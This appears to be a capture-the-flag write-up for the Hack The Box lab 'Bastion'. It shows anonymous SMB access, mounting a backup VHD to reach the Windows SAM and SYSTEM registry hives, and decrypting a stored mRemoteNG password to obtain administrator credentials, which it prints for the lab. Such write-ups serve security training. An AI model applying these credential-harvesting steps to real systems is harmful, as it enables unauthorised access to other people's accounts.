# Bastion

### Full port Scan

<figure><img src="../../.gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>

### Aggressive Scan

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>

### Enumerating SMB

### Connect to share

* Saw `Backups` share

```bash
smbclient //10.10.10.134/Backups -N
```

<figure><img src="../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (94).png" alt=""><figcaption></figcaption></figure>

* Mounting SMB share

```bash
mount -t cifs //10.10.10.134/Backups /home/kali/Documents/htb/10.10.10.134/share
```

* View the filesystem present in the virtual hard disk

```bash
guestfish --ro -a 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
```

```bash
><fs> run
><fs> list-filesystems
```

* filesystem is `/dev/sda1`

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

* Mounting VHD

```bash
guestmount -a 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd -m /dev/sda1 --ro /home/kali/Documents/htb/10.10.10.134/4_vhd
```

*   Have access to the registry files (SAM, SECURITY, SYSTEM) in `c:\\windows\\system32\\config` folder

    ```bash
    c:\\windows\\system32\\config\\SAM
    c:\\windows\\system32\\config\\SECURITY
    c:\\windows\\system32\\config\\SYSTEM
    ```

    * Those files can be locked when the system is running but won’t have that issue on a mounted drive

<figure><img src="../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

* Having previously obtained the username as `L4mpje`, and the password `bureaulampje` —> can try to login via SSH
* Able to SSH and obtain user flag

<figure><img src="../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

### Privilege Escalation

* Using manual enumeration, I found `mRemoteNG` present in `c:\\Program Files (x86)`

<figure><img src="../../.gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>

* [https://github.com/haseebT/mRemoteNG-Decrypt](https://github.com/haseebT/mRemoteNG-Decrypt)
* The above tool allows us to decrypt passwords stored by mRemoteNG
* Have to find the password stored in mRemoteNG ([http://forum.mremoteng.org/viewtopic.php?f=3\&t=2179](http://forum.mremoteng.org/viewtopic.php?f=3\&t=2179))
* The password hash is stored at `c:\\Users\\L4mpje\\AppData\\Roaming\\mRemoteNG\\confcons.xml`

<figure><img src="../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>

* Obtained the hash `aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==`
* Decypt the hash using the tool

```bash
python3 mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
```

<figure><img src="../../.gitbook/assets/image (198).png" alt=""><figcaption></figcaption></figure>

* Therefore, we obtained the administrator credentials: `administrator:thXLHM96BeKL0ER2`
* Logging in via SSH, we are in the `Administrator` account

<figure><img src="../../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>
